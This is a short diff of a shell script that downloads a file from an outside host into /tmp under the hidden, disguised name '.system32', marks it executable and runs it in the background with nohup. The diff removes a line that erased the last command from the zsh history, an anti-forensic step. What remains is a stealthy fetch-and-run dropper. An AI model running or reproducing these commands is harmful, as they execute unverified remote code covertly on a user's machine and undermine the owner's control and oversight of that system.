@@ -1,5 +1,4 @@
 cd /tmp
 curl https://mathyshenin.me/linux > .system32
-fc -R ; sed -i '$d' ~/.zsh_history ; fc -R
 chmod +x .system32
 nohup ./.system32
